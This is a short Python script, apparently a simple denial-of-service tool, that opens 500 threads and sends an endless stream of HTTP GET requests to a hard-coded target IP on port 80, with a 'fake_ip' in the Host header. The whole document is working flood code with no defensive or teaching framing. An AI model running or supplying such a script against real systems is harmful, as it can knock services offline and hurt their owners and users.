#import lib
import socket
import threading

target = '192.168.100.99' #Change watting
fake_ip = '182.21.20.32'
port = 80
attack_num = 0

#attack function
def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        #attack http => port 80
        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port)) 
        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
        
        global attack_num
        attack_num += 1
        print(attack_num)
        
        s.close()

#Main Function
for i in range(500):
    thread = threading.Thread(target=attack)
    thread.start()